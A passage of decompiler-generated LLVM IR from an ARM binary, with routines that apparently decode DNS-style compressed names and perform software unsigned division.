dec_label_pc_149c0.preheader:                     ; preds = %dec_label_pc_1491c
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1492c = load i32, i32* @r2, align 4
  store i32 %v0_1492c, i32* %sb.global-to-local, align 4
  %v0_14930 = load i32, i32* @r3, align 4
  store i32 %v0_14930, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_149c03952 = load i32, i32* @r1, align 4
  %v2_149c04053 = add i32 %v1_149c03952, %v0_14920
  %v3_149c04154 = inttoptr i32 %v2_149c04053 to i8*
  %v4_149c04255 = load i8, i8* %v3_149c04154, align 1
  %v6_149c04356 = zext i8 %v4_149c04255 to i32
  store i32 %v6_149c04356, i32* @r4, align 4
  %v2_149c44457 = icmp eq i8 %v4_149c04255, 0
  br i1 %v2_149c44457, label %bb35, label %dec_label_pc_14944.lr.ph

dec_label_pc_14944:                               ; preds = %dec_label_pc_14944.lr.ph, %bb30
  %v2_149cc50 = phi i1 [ %v2_149cc4663, %dec_label_pc_14944.lr.ph ], [ true, %bb30 ]
  %v6_149c048 = phi i32 [ %v6_149c04361, %dec_label_pc_14944.lr.ph ], [ %v6_149c0, %bb30 ]
  %v1_149c047 = phi i32 [ %v1_149c03960, %dec_label_pc_14944.lr.ph ], [ %v5_1496c, %bb30 ]
  %v1_14948 = and i32 %v6_149c048, 192
  br i1 %v2_149cc50, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_14944
  %v1_1494c = load i32, i32* %r8.global-to-local, align 4
  %v2_1494c = add i32 %v1_1494c, 1
  store i32 %v2_1494c, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_14944, %bb
  %v2_14950 = icmp eq i32 %v1_14948, 192
  %v1_14954 = add i32 %v1_149c047, 1
  store i32 %v1_14954, i32* @r5, align 4
  br i1 %v2_14950, label %dec_label_pc_1495c, label %dec_label_pc_1497c

dec_label_pc_1495c:                               ; preds = %bb28
  %v2_1495c = add i32 %v1_14954, %v0_1495c.ph59
  %v3_1495c = inttoptr i32 %v2_1495c to i8*
  %v4_1495c = load i8, i8* %v3_1495c, align 1
  %v6_1495c = zext i8 %v4_1495c to i32
  %v1_14964 = urem i32 %v6_149c048, 64
  br i1 %v2_149cc50, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_1495c
  %v1_14968 = load i32, i32* %r8.global-to-local, align 4
  %v2_14968 = add i32 %v1_14968, 1
  store i32 %v2_14968, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_1495c, %bb29
  %v4_1496c = mul nuw nsw i32 %v1_14964, 256
  %v5_1496c = or i32 %v6_1495c, %v4_1496c
  store i32 %v5_1496c, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_149c0 = add i32 %v5_1496c, %v0_1495c.ph59
  %v3_149c0 = inttoptr i32 %v2_149c0 to i8*
  %v4_149c0 = load i8, i8* %v3_149c0, align 1
  %v6_149c0 = zext i8 %v4_149c0 to i32
  store i32 %v6_149c0, i32* @r4, align 4
  %v2_149c4 = icmp eq i8 %v4_149c0, 0
  br i1 %v2_149c4, label %dec_label_pc_149cc.bb36_crit_edge, label %dec_label_pc_14944

dec_label_pc_1497c:                               ; preds = %bb28
  %v2_1497c = add i32 %v6_149c048, %storemerge17.ph58
  store i32 %v2_1497c, i32* %r6.global-to-local, align 4
  %v2_14980 = load i32, i32* %stack_var_-40, align 4
  %v1_14984 = add i32 %v2_1497c, 1
  store i32 %v1_14984, i32* %r7.global-to-local, align 4
  %v3_14988 = icmp ult i32 %v1_14984, %v2_14980
  br i1 %v3_14988, label %dec_label_pc_14990, label %dec_label_pc_149e0

dec_label_pc_14990:                               ; preds = %dec_label_pc_1497c
  %v2_14990 = add i32 %v1_14954, %v0_1495c.ph59
  store i32 %v2_14990, i32* @r1, align 4
  %v0_14994 = load i32, i32* %sb.global-to-local, align 4
  %v2_14994 = add i32 %v0_14994, %storemerge17.ph58
  store i32 %v2_14994, i32* @r0, align 4
  store i32 %v6_149c048, i32* @r2, align 4
  %v0_1499c = call i32 @function_ec10()
  %v0_149a0 = load i32, i32* @r5, align 4
  %v1_149a0 = load i32, i32* @r4, align 4
  %v2_149a0 = add i32 %v1_149a0, %v0_149a0
  store i32 %v2_149a0, i32* %r1.global-to-local, align 4
  %v0_149a4 = load i32, i32* %sl.global-to-local, align 4
  %v2_149a4 = add i32 %v0_149a4, %v2_149a0
  %v3_149a4 = inttoptr i32 %v2_149a4 to i8*
  %v4_149a4 = load i8, i8* %v3_149a4, align 1
  %v0_149a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_149a8 = icmp eq i32 %v0_149a8, 0
  br i1 %v2_149a8, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_14990
  %v1_149ac = load i32, i32* %r8.global-to-local, align 4
  %v3_149ac = add i32 %v1_149ac, %v1_149a0
  store i32 %v3_149ac, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_14990, %bb31
  %v2_149b0 = icmp eq i8 %v4_149a4, 0
  br i1 %v2_149b0, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_149b8.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_149b8 = load i32, i32* %sb.global-to-local, align 4
  %v3_149b8 = load i32, i32* %r6.global-to-local, align 4
  %v4_149b8 = add i32 %v3_149b8, %v2_149b8
  %v5_149b8 = inttoptr i32 %v4_149b8 to i8*
  store i8 %v0_149b8.off0, i8* %v5_149b8, align 1
  %v0_149bc.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_149c0.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_149cc.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_149c039 = load i32, i32* %r1.global-to-local, align 4
  %v2_149c040 = add i32 %v1_149c039, %v0_149c0.pre.pre
  %v3_149c041 = inttoptr i32 %v2_149c040 to i8*
  %v4_149c042 = load i8, i8* %v3_149c041, align 1
  %v6_149c043 = zext i8 %v4_149c042 to i32
  store i32 %v6_149c043, i32* @r4, align 4
  %v2_149c444 = icmp eq i8 %v4_149c042, 0
  %v2_149cc46 = icmp eq i32 %v0_149cc.pre.pre, 0
  br i1 %v2_149c444, label %dec_label_pc_149cc, label %dec_label_pc_14944.lr.ph

dec_label_pc_14944.lr.ph:                         ; preds = %dec_label_pc_149c0.preheader, %bb34
  %v2_149cc4663 = phi i1 [ %v2_149cc46, %bb34 ], [ false, %dec_label_pc_149c0.preheader ]
  %v6_149c04361 = phi i32 [ %v6_149c043, %bb34 ], [ %v6_149c04356, %dec_label_pc_149c0.preheader ]
  %v1_149c03960 = phi i32 [ %v1_149c039, %bb34 ], [ %v1_149c03952, %dec_label_pc_149c0.preheader ]
  %v0_1495c.ph59 = phi i32 [ %v0_149c0.pre.pre, %bb34 ], [ %v0_14920, %dec_label_pc_149c0.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_149bc.pre, %bb34 ], [ 0, %dec_label_pc_149c0.preheader ]
  br label %dec_label_pc_14944

dec_label_pc_149cc:                               ; preds = %bb34
  br i1 %v2_149cc46, label %dec_label_pc_149cc.bb36_crit_edge, label %bb35

dec_label_pc_149cc.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_149cc
  %v0_149d4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_149e0

bb35:                                             ; preds = %dec_label_pc_149c0.preheader, %dec_label_pc_149cc
  %v1_149d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_149d0 = add i32 %v1_149d0, 1
  store i32 %v2_149d0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_1497c, %bb35, %dec_label_pc_149cc.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_149d4.pre, %dec_label_pc_149cc.bb36_crit_edge ], [ %v2_149d0, %bb35 ], [ -1, %dec_label_pc_1497c ]
  store i32 %v3_1491c, i32* @r4, align 4
  store i32 %v6_1491c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1495c.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_149c0, { 1, 0 }
  uselistorder i32 %v5_1496c, { 0, 2, 1 }
  uselistorder i32 %v6_149c048, { 2, 1, 0, 3 }
  uselistorder i1 %v2_149cc50, { 1, 0 }
  uselistorder i32 %v0_14920, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5, 6, 7 }
  uselistorder i32 ()* @function_ec10, { 16, 15, 20, 14, 4, 13, 12, 2, 9, 8, 1, 0, 11, 7, 6, 5, 21, 19, 18, 17, 10, 3 }
  uselistorder i32 64, { 0, 6, 2, 3, 4, 11, 7, 8, 5, 1, 9, 10 }
  uselistorder label %dec_label_pc_149e0, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_149cc.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14944.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_149e8() local_unnamed_addr {
dec_label_pc_149e8:
  %v0_149ec = load i32, i32* @r0, align 4
  store i32 %v0_149ec, i32* @lr, align 4
  %v2_149ec = icmp eq i32 %v0_149ec, 0
  br i1 %v2_149ec, label %bb, label %dec_label_pc_14a04

bb:                                               ; preds = %dec_label_pc_149e8
  ret i32 -1

dec_label_pc_149fc:                               ; preds = %dec_label_pc_14a0c
  %v1_149fc = add i32 %v1_14a14, 2
  br label %dec_label_pc_14a2c

dec_label_pc_14a04:                               ; preds = %dec_label_pc_149e8
  %v0_14a04 = load i32, i32* @r1, align 4
  br label %dec_label_pc_14a14

dec_label_pc_14a0c:                               ; preds = %dec_label_pc_14a14
  %v1_14a20 = and i32 %v6_14a14, 192
  %v2_14a24 = add i32 %v6_14a14, %v1_14a18
  %v2_14a0c = icmp eq i32 %v1_14a20, 192
  br i1 %v2_14a0c, label %dec_label_pc_149fc, label %dec_label_pc_14a14

dec_label_pc_14a14:                               ; preds = %dec_label_pc_14a0c, %dec_label_pc_14a04
  %v1_14a14 = phi i32 [ %v2_14a24, %dec_label_pc_14a0c ], [ %v0_14a04, %dec_label_pc_14a04 ]
  %v2_14a14 = add i32 %v1_14a14, %v0_149ec
  %v3_14a14 = inttoptr i32 %v2_14a14 to i8*
  %v4_14a14 = load i8, i8* %v3_14a14, align 1
  %v6_14a14 = zext i8 %v4_14a14 to i32
  %v1_14a18 = add i32 %v1_14a14, 1
  %v2_14a1c = icmp eq i8 %v4_14a14, 0
  br i1 %v2_14a1c, label %dec_label_pc_14a2c, label %dec_label_pc_14a0c

dec_label_pc_14a2c:                               ; preds = %dec_label_pc_14a14, %dec_label_pc_149fc
  %v1_14a2c = phi i32 [ %v1_149fc, %dec_label_pc_149fc ], [ %v1_14a18, %dec_label_pc_14a14 ]
  %v2_14a2c = sub i32 %v1_14a2c, %v0_14a04
  ret i32 %v2_14a2c

; uselistorder directives
  uselistorder i32 %v6_14a14, { 1, 0 }
  uselistorder i32 %v1_14a14, { 2, 1, 0 }
  uselistorder i32 %v0_149ec, { 0, 2, 1 }
  uselistorder i8 0, { 60, 18, 25, 26, 61, 17, 22, 62, 27, 28, 29, 30, 31, 49, 66, 64, 48, 65, 63, 47, 42, 8, 9, 67, 68, 72, 73, 24, 57, 58, 69, 70, 71, 15, 74, 43, 50, 76, 0, 75, 51, 44, 77, 78, 79, 80, 81, 82, 32, 10, 54, 86, 1, 84, 83, 52, 2, 85, 53, 3, 87, 88, 33, 4, 90, 89, 55, 91, 92, 93, 94, 45, 95, 97, 98, 96, 11, 12, 13, 99, 5, 16, 100, 101, 102, 19, 59, 104, 105, 106, 107, 103, 46, 108, 109, 110, 111, 34, 35, 36, 37, 38, 112, 20, 14, 23, 6, 7, 114, 113, 39, 115, 116, 40, 117, 56, 21, 118, 119, 120, 121, 124, 122, 123, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 143, 41, 145, 146, 147 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 7, 3, 6 }
}

define i32 @function_14a34() local_unnamed_addr {
dec_label_pc_14a34:
  %v0_14a34 = load i32, i32* @r1, align 4
  %v1_14a34 = add i32 %v0_14a34, -1
  %v7_14a34 = icmp eq i32 %v0_14a34, 1
  br i1 %v7_14a34, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_14a34
  %v2_14a38 = load i32, i32* @r0, align 4
  ret i32 %v2_14a38

bb82:                                             ; preds = %dec_label_pc_14a34
  %v2_14a34 = icmp eq i32 %v0_14a34, 0
  br i1 %v2_14a34, label %dec_label_pc_14b1c, label %dec_label_pc_14a40

dec_label_pc_14a40:                               ; preds = %bb82
  %v0_14a40 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_14a40, %v0_14a34
  br i1 %tmp, label %dec_label_pc_14a48, label %dec_label_pc_14ad4

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a40
  %v2_14a48 = and i32 %v1_14a34, %v0_14a34
  %v4_14a48 = icmp eq i32 %v2_14a48, 0
  br i1 %v4_14a48, label %dec_label_pc_14ae0, label %dec_label_pc_14a50

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a48
  %v3_14a50 = icmp ult i32 %v0_14a34, 536870912
  br i1 %v3_14a50, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14a50
  %v4_14a54 = mul i32 %v0_14a34, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14a50, %.thread
  %v0_14a74.pr36.ph = phi i32 [ %v4_14a54, %.thread ], [ %v0_14a34, %dec_label_pc_14a50 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14a50 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_14a74.pr36 = phi i32 [ %v4_14a68, %bb85 ], [ %v0_14a74.pr36.ph, %.preheader.preheader ]
  %v1_14a6c = phi i32 [ %v4_14a6c, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_14a60 = icmp ugt i32 %v0_14a74.pr36, 268435455
  br i1 %v2_14a60, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_14a74thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_14a64 = icmp ult i32 %v0_14a74.pr36, %v0_14a40
  br i1 %v4_14a64, label %bb84, label %dec_label_pc_14a74thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_14a68 = and i32 %v0_14a74.pr36, 268435456
  %v3_14a68 = icmp eq i32 %v2_14a68, 0
  %v4_14a68 = mul i32 %v0_14a74.pr36, 16
  br i1 %v3_14a68, label %bb85, label %dec_label_pc_14a74.loopexit

bb85:                                             ; preds = %bb84
  %v2_14a6c = and i32 %v1_14a6c, 268435456
  %v3_14a6c = icmp eq i32 %v2_14a6c, 0
  %v4_14a6c = mul i32 %v1_14a6c, 16
  br i1 %v3_14a6c, label %.preheader, label %dec_label_pc_14a74thread-pre-split.loopexit.loopexit

dec_label_pc_14a74thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_14a8048.ph = phi i32 [ %v1_14a6c, %bb83 ], [ %v4_14a6c, %bb85 ]
  %v0_14a74.pr38.ph = phi i32 [ %v0_14a74.pr36, %bb83 ], [ %v4_14a68, %bb85 ]
  br label %dec_label_pc_14a74thread-pre-split.loopexit

dec_label_pc_14a74thread-pre-split.loopexit:      ; preds = %dec_label_pc_14a74thread-pre-split.loopexit.loopexit, %.thread2
  %v1_14a8048 = phi i32 [ %v1_14a6c, %.thread2 ], [ %v1_14a8048.ph, %dec_label_pc_14a74thread-pre-split.loopexit.loopexit ]
  %v0_14a74.pr38 = phi i32 [ %v0_14a74.pr36, %.thread2 ], [ %v0_14a74.pr38.ph, %dec_label_pc_14a74thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14a74thread-pre-split

dec_label_pc_14a74thread-pre-split:               ; preds = %dec_label_pc_14a74thread-pre-split.loopexit, %bb87
  %v1_14a8046 = phi i32 [ %v1_14a8048, %dec_label_pc_14a74thread-pre-split.loopexit ], [ %v3_14a80, %bb87 ]
  %v0_14a74.pr = phi i32 [ %v0_14a74.pr38, %dec_label_pc_14a74thread-pre-split.loopexit ], [ %v3_14a7c, %bb87 ]
  br label %dec_label_pc_14a74

dec_label_pc_14a74.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_14a74

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a74.loopexit, %dec_label_pc_14a74thread-pre-split
  %v1_14a80 = phi i32 [ %v1_14a8046, %dec_label_pc_14a74thread-pre-split ], [ %v1_14a6c, %dec_label_pc_14a74.loopexit ]
  %v1_14a7c = phi i32 [ %v0_14a74.pr, %dec_label_pc_14a74thread-pre-split ], [ %v4_14a68, %dec_label_pc_14a74.loopexit ]
  %v2_14a74 = icmp slt i32 %v1_14a7c, 0
  br i1 %v2_14a74, label %dec_label_pc_14a88, label %bb86

bb86:                                             ; preds = %dec_label_pc_14a74
  %v4_14a78 = icmp ult i32 %v1_14a7c, %v0_14a40
  br i1 %v4_14a78, label %bb87, label %dec_label_pc_14a88

bb87:                                             ; preds = %bb86
  %v3_14a7c = mul i32 %v1_14a7c, 2
  %v2_14a80 = icmp slt i32 %v1_14a80, 0
  %v3_14a80 = mul i32 %v1_14a80, 2
  br i1 %v2_14a80, label %dec_label_pc_14a88, label %dec_label_pc_14a74thread-pre-split

dec_label_pc_14a88:                               ; preds = %bb86, %dec_label_pc_14a74, %bb87
  %v2_14a9459 = phi i32 [ %v3_14a80, %bb87 ], [ %v1_14a80, %bb86 ], [ %v1_14a80, %dec_label_pc_14a74 ]
  %v1_14a8c51 = phi i32 [ %v3_14a7c, %bb87 ], [ %v1_14a7c, %bb86 ], [ %v1_14a7c, %dec_label_pc_14a74 ]
  br label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %.thread11, %dec_label_pc_14a88
  %v1_14ac0 = phi i32 [ %v4_14ac0, %.thread11 ], [ %v2_14a9459, %dec_label_pc_14a88 ]
  %v1_14a94 = phi i32 [ %v0_14acc, %.thread11 ], [ 0, %dec_label_pc_14a88 ]
  %v1_14ac4 = phi i32 [ %v4_14ac4, %.thread11 ], [ %v1_14a8c51, %dec_label_pc_14a88 ]
  %v1_14a90 = phi i32 [ %v0_14abc, %.thread11 ], [ %v0_14a40, %dec_label_pc_14a88 ]
  %v3_14a8c = icmp ult i32 %v1_14a90, %v1_14ac4
  br i1 %v3_14a8c, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_14a8c
  %v3_14a90 = sub i32 %v1_14a90, %v1_14ac4
  %v3_14a94 = or i32 %v1_14a94, %v1_14ac0
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14a8c, %bb88
  %v1_14a9c = phi i32 [ %v1_14a90, %dec_label_pc_14a8c ], [ %v3_14a90, %bb88 ]
  %v1_14aa0 = phi i32 [ %v1_14a94, %dec_label_pc_14a8c ], [ %v3_14a94, %bb88 ]
  %v4_14a98 = udiv i32 %v1_14ac4, 2
  %v6_14a98 = icmp ult i32 %v1_14a9c, %v4_14a98
  br i1 %v6_14a98, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_14a9c = urem i32 %v1_14ac4, 2
  %v4_14a9c = icmp eq i32 %v3_14a9c, 0
  %v6_14a9c = sub i32 %v1_14a9c, %v4_14a98
  br i1 %v4_14a9c, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_14aa0 = udiv i32 %v1_14ac0, 2
  %v6_14aa0 = or i32 %v1_14aa0, %v5_14aa0
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_14aa8 = phi i32 [ %v6_14a9c, %bb89 ], [ %v1_14a9c, %.thread7 ], [ %v6_14a9c, %bb90 ]
  %v1_14aac = phi i32 [ %v1_14aa0, %bb89 ], [ %v1_14aa0, %.thread7 ], [ %v6_14aa0, %bb90 ]
  %v4_14aa4 = udiv i32 %v1_14ac4, 4
  %v6_14aa4 = icmp ult i32 %v1_14aa8, %v4_14aa4
  br i1 %v6_14aa4, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_14aa8 = and i32 %v1_14ac4, 2
  %v4_14aa8 = icmp eq i32 %v3_14aa8, 0
  %v6_14aa8 = sub i32 %v1_14aa8, %v4_14aa4
  br i1 %v4_14aa8, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_14aac = udiv i32 %v1_14ac0, 4
  %v6_14aac = or i32 %v1_14aac, %v5_14aac
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_14ab4 = phi i32 [ %v6_14aa8, %bb91 ], [ %v1_14aa8, %.thread8 ], [ %v6_14aa8, %bb92 ]
  %v1_14ab8 = phi i32 [ %v1_14aac, %bb91 ], [ %v1_14aac, %.thread8 ], [ %v6_14aac, %bb92 ]
  %v4_14ab0 = udiv i32 %v1_14ac4, 8
  %v6_14ab0 = icmp ult i32 %v1_14ab4, %v4_14ab0
  br i1 %v6_14ab0, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_14ab4 = and i32 %v1_14ac4, 4
  %v4_14ab4 = icmp eq i32 %v3_14ab4, 0
  %v6_14ab4 = sub i32 %v1_14ab4, %v4_14ab0
  br i1 %v4_14ab4, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_14ab8 = udiv i32 %v1_14ac0, 8
  %v6_14ab8 = or i32 %v1_14ab8, %v5_14ab8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_14acc = phi i32 [ %v1_14ab8, %bb93 ], [ %v1_14ab8, %.thread9 ], [ %v6_14ab8, %bb94 ]
  %v0_14abc = phi i32 [ %v6_14ab4, %bb93 ], [ %v1_14ab4, %.thread9 ], [ %v6_14ab4, %bb94 ]
  %v2_14abc = icmp eq i32 %v0_14abc, 0
  br i1 %v2_14abc, label %dec_label_pc_14acc, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_14ac0, 16
  br i1 %tmp142, label %dec_label_pc_14acc, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_14ac0 = udiv i32 %v1_14ac0, 16
  %v4_14ac4 = udiv i32 %v1_14ac4, 16
  br label %dec_label_pc_14a8c

dec_label_pc_14acc:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_14acc

dec_label_pc_14ad4:                               ; preds = %dec_label_pc_14a40
  %v9_14a40 = icmp eq i32 %v0_14a40, %v0_14a34
  %. = zext i1 %v9_14a40 to i32
  ret i32 %.

dec_label_pc_14ae0:                               ; preds = %dec_label_pc_14a48
  %v2_14ae0 = icmp ugt i32 %v0_14a34, 65535
  br i1 %v2_14ae0, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_14ae0
  %v2_14ae4 = and i32 %v0_14a34, 32768
  %v3_14ae4 = icmp eq i32 %v2_14ae4, 0
  %v4_14ae4 = udiv i32 %v0_14a34, 65536
  br i1 %v3_14ae4, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_14ae0
  %v0_14af065 = phi i32 [ %v0_14a34, %dec_label_pc_14ae0 ], [ %v4_14ae4, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_14af4 = phi i32 [ %v0_14af065, %.thread16 ], [ %v4_14ae4, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_14af0 = icmp ugt i32 %v1_14af4, 255
  br i1 %v2_14af0, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_14af4 = and i32 %v1_14af4, 128
  %v3_14af4 = icmp eq i32 %v2_14af4, 0
  %v4_14af4 = udiv i32 %v1_14af4, 256
  br i1 %v3_14af4, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_14af8 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_14b04 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_14af8, %bb102 ]
  %v1_14b00 = phi i32 [ %v1_14af4, %bb100 ], [ %v4_14af4, %bb101 ], [ %v4_14af4, %bb102 ]
  %v2_14afc = icmp ugt i32 %v1_14b00, 15
  br i1 %v2_14afc, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_14b00 = and i32 %v1_14b00, 8
  %v3_14b00 = icmp eq i32 %v2_14b00, 0
  %v4_14b00 = udiv i32 %v1_14b00, 16
  br i1 %v3_14b00, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_14b04 = add nsw i32 %v1_14b04, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_14b0c = phi i32 [ %v1_14b04, %.thread17 ], [ %v1_14b04, %bb103 ], [ %v2_14b04, %bb104 ]
  %v5_14b10 = phi i32 [ %v1_14b00, %.thread17 ], [ %v4_14b00, %bb103 ], [ %v4_14b00, %bb104 ]
  %v2_14b08 = icmp ugt i32 %v5_14b10, 3
  %v7_14b08 = icmp eq i32 %v5_14b10, 4
  %v2_14b0c = xor i1 %v7_14b08, true
  %v3_14b0c = and i1 %v2_14b08, %v2_14b0c
  br i1 %v3_14b0c, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_14b0c = add nsw i32 %v4_14b0c, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_14b10 = phi i32 [ %v4_14b0c, %.thread18 ], [ %v5_14b0c, %bb105 ]
  %v2_14b10 = xor i1 %v2_14b08, true
  %v3_14b10 = or i1 %v7_14b08, %v2_14b10
  br i1 %v3_14b10, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_14b10 = udiv i32 %v5_14b10, 2
  %v9_14b10 = add i32 %v4_14b10, %v8_14b10
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_14b14 = phi i32 [ %v4_14b10, %bb106 ], [ %v9_14b10, %bb107 ]
  %v6_14b14 = lshr i32 %v0_14a40, %v1_14b14
  ret i32 %v6_14b14

dec_label_pc_14b1c:                               ; preds = %bb82
  %v0_14b1c = load i32, i32* @lr, align 4
  %v0_14b20 = call i32 @function_ca14()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_14b1c)
  %v9_14b2c = load i32, i32* @lr, align 4
  %v0_14b30 = call i32 @function_14a34()
  store i32 %v9_14b2c, i32* @lr, align 4
  ret i32 %v0_14b30

; uselistorder directives
  uselistorder i32 %v4_14b10, { 1, 0 }
  uselistorder i1 %v7_14b08, { 1, 0 }
  uselistorder i32 %v4_14b00, { 1, 0 }
  uselistorder i32 %v1_14b00, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14af4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14af4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14ae4, { 1, 0 }
  uselistorder i32 %v0_14abc, { 1, 0 }
  uselistorder i32 %v4_14ab0, { 1, 0 }
  uselistorder i32 %v1_14ab8, { 1, 2, 0 }
  uselistorder i32 %v4_14aa4, { 1, 0 }
  uselistorder i32 %v1_14aac, { 1, 2, 0 }
  uselistorder i32 %v4_14a98, { 1, 0 }
  uselistorder i32 %v1_14aa0, { 1, 2, 0 }
  uselistorder i32 %v1_14ac4, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14a94, { 1, 0 }
  uselistorder i32 %v1_14ac0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14a80, { 1, 0 }
  uselistorder i32 %v3_14a7c, { 1, 0 }
  uselistorder i32 %v1_14a7c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_14a80, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14a6c, { 1, 0 }
  uselistorder i32 %v4_14a68, { 2, 1, 0 }
  uselistorder i32 %v1_14a6c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14a74.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_14a40, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_14a34, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 ()* @function_14a34, { 12, 11, 10, 9, 7, 6, 5, 4, 3, 2, 8, 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_14acc, { 1, 0 }
